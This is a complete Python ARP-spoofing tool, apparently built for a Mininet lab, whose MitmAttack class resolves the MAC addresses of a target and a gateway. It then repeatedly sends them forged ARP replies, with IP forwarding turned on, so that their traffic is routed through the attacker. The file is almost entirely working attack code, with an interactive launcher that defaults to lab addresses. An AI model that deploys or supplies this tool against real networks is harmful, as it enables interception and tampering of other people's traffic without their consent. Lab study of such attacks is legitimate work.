import os
import sys
import time
import logging
import threading
import subprocess
from typing import Optional

try:
    from scapy.all import send, srp, conf, get_if_list
    from scapy.layers.l2 import ARP, Ether

    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

LOG_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'logs'))
os.makedirs(LOG_DIR, exist_ok=True)

logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(os.path.join(LOG_DIR, 'mitm_attack.log'), encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class MitmAttack:
    def __init__(self, target_ip: str, gateway_ip: str, iface: Optional[str] = None, interval: float = 2.0):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.iface = iface or self._get_default_interface()
        self.interval = interval
        self._stop_event = threading.Event()
        self.target_mac = None
        self.gateway_mac = None

        if not SCAPY_AVAILABLE:
            raise ImportError("Scapy is required for MITM attack. Install with: pip install scapy")

        if os.geteuid() != 0:
            raise PermissionError("MITM attack requires root privileges. Run with sudo.")

        self._enable_ip_forwarding()

    @staticmethod
    def _get_default_interface() -> str:
        """Get default network interface"""
        try:
            if SCAPY_AVAILABLE:
                return conf.iface
            result = subprocess.run(['ip', 'route', 'show', 'default'],
                                    capture_output=True, text=True, check=True)
            return result.stdout.split()[4]
        except Exception as e:
            logger.warning("Could not determine default interface: %s", e)
            return "eth0"

    @staticmethod
    def _enable_ip_forwarding():
        """Enable IP forwarding for MITM"""
        try:
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write('1\n')
            logger.info("IP forwarding enabled")
        except Exception as e:
            logger.error("Failed to enable IP forwarding: %s", e)

    @staticmethod
    def _disable_ip_forwarding():
        """Disable IP forwarding"""
        try:
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write('0\n')
            logger.info("IP forwarding disabled")
        except Exception as e:
            logger.error("Failed to disable IP forwarding: %s", e)

    def _get_mac(self, ip: str) -> Optional[str]:
        """Get MAC address for IP using ARP"""
        try:
            logger.info(f"Resolving MAC address for {ip}")
            arp_req = ARP(pdst=ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = broadcast / arp_req

            answered, _ = srp(packet, timeout=3, verbose=False, iface=self.iface, retry=3)

            if answered:
                mac = answered[0][1][Ether].src
                logger.info(f"✅ Resolved {ip} -> {mac}")
                return mac
            else:
                logger.error(f"❌ Could not resolve MAC for {ip}")
                return None

        except Exception as e:
            logger.error(f"Error getting MAC for {ip}: {e}")
            return None

    def _spoof(self, target_ip: str, spoof_ip: str, target_mac: str):
        """Send spoofed ARP packet"""
        try:
             packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
             send(packet, verbose=False, iface=self.iface)
        except Exception as e:
            logger.error(f"Error spoofing {target_ip}: {e}")

    def _restore(self, dest_ip: str, src_ip: str, dest_mac: str, src_mac: str):
        """Restore ARP tables to original state"""
        try:
            packet = ARP(op=2, pdst=dest_ip, hwdst=dest_mac,
                         psrc=src_ip, hwsrc=src_mac)
            send(packet, count=5, verbose=False, iface=self.iface)
            logger.info(f"Restored ARP: {dest_ip} -> {src_ip}")
        except Exception as e:
            logger.error(f"Error restoring ARP: {e}")

    def _check_connectivity(self) -> bool:
        """Check if target and gateway are reachable"""
        try:
            result = subprocess.run(['ping', '-c', '1', '-W', '2', self.target_ip],
                                    capture_output=True, timeout=3)
            if result.returncode != 0:
                logger.error(f"❌ Target {self.target_ip} is not reachable")
                return False

            result = subprocess.run(['ping', '-c', '1', '-W', '2', self.gateway_ip],
                                    capture_output=True, timeout=3)
            if result.returncode != 0:
                logger.error(f"❌ Gateway {self.gateway_ip} is not reachable")
                return False

            logger.info("✅ Target and gateway are reachable")
            return True

        except Exception as e:
            logger.error(f"Connectivity check failed: {e}")
            return False

    def run(self) -> bool:
        """Execute MITM attack"""
        try:
            logger.info("=" * 60)
            logger.info("🕵️  MITM ATTACK STARTED")
            logger.info(f"Target: {self.target_ip}")
            logger.info(f"Gateway: {self.gateway_ip}")
            logger.info(f"Interface: {self.iface}")
            logger.info("=" * 60)

            print("\n🔍 Checking network connectivity...")
            if not self._check_connectivity():
                print("❌ Target or gateway is not reachable")
                return False
            print("✅ Network connectivity verified")

            print("\n🔍 Resolving MAC addresses...")
            self.target_mac = self._get_mac(self.target_ip)
            self.gateway_mac = self._get_mac(self.gateway_ip)

            if not self.target_mac or not self.gateway_mac:
                logger.error("❌ Failed to get MAC addresses")
                print("❌ Could not resolve MAC addresses")
                print(f"   Target MAC: {self.target_mac or 'FAILED'}")
                print(f"   Gateway MAC: {self.gateway_mac or 'FAILED'}")
                return False

            print(f"✅ Target MAC: {self.target_mac}")
            print(f"✅ Gateway MAC: {self.gateway_mac}")

            logger.info(f"Target MAC: {self.target_mac}, Gateway MAC: {self.gateway_mac}")

            print("\n⚡ Starting ARP poisoning...")
            print("   Press Ctrl+C to stop the attack")

            packet_count = 0
            start_time = time.time()

            try:
                while not self._stop_event.is_set():
                    self._spoof(self.target_ip, self.gateway_ip, self.target_mac)

                    self._spoof(self.gateway_ip, self.target_ip, self.gateway_mac)

                    packet_count += 2
                    elapsed = time.time() - start_time

                    if packet_count % 10 == 0:
                        print(f"\r⚡ Poisoning... {packet_count} packets sent ({elapsed:.0f}s)",
                              end="", flush=True)

                    logger.debug(f"Sent spoofed ARP packets ({packet_count})")
                    time.sleep(self.interval)

            except KeyboardInterrupt:
                print("\n\n⏹️  Attack interrupted by user")
                logger.info("Attack interrupted by user")

            print(f"\n\n📊 Attack Summary:")
            print(f"   Duration: {time.time() - start_time:.1f} seconds")
            print(f"   Packets sent: {packet_count}")
            print(f"   Average rate: {packet_count / (time.time() - start_time):.1f} packets/sec")

            return True

        except Exception as e:
            logger.error(f"MITM attack error: {e}", exc_info=True)
            print(f"\n❌ Attack failed: {e}")
            return False

        finally:
            print("\n🔄 Restoring network ARP tables...")
            self._restore(self.target_ip, self.gateway_ip,
                          self.target_mac, self.gateway_mac)
            self._restore(self.gateway_ip, self.target_ip,
                          self.gateway_mac, self.target_mac)

            self._disable_ip_forwarding()

            print("✅ Network restored to normal state")
            logger.info("MITM attack stopped and ARP tables restored")

    def stop(self):
        """Stop the attack gracefully"""
        self._stop_event.set()

def test_mitm():
    """Test MITM attack with default Mininet hosts"""
    if os.geteuid() != 0:
        print("❌ This script must be run as root (sudo)")
        return False

    if not SCAPY_AVAILABLE:
        print("❌ Scapy not installed. Install with: pip install scapy")
        return False

    print("\n🕵️  MITM Attack Test")
    print("=" * 60)

    target_ip = input("Enter target IP [10.0.0.2]: ").strip() or "10.0.0.2"
    gateway_ip = input("Enter gateway IP [10.0.0.1]: ").strip() or "10.0.0.1"

    print(f"\nTarget: {target_ip}")
    print(f"Gateway: {gateway_ip}")

    confirm = input("\n⚠️  Start MITM attack? (yes/no): ").strip().lower()
    if confirm != 'yes':
        print("❌ Attack cancelled")
        return False

    try:
        mitm = MitmAttack(target_ip=target_ip, gateway_ip=gateway_ip)
        return mitm.run()
    except Exception as e:
        print(f"❌ Error: {e}")
        logger.error(f"Test failed: {e}")
        return False

if __name__ == "__main__":
    test_mitm()
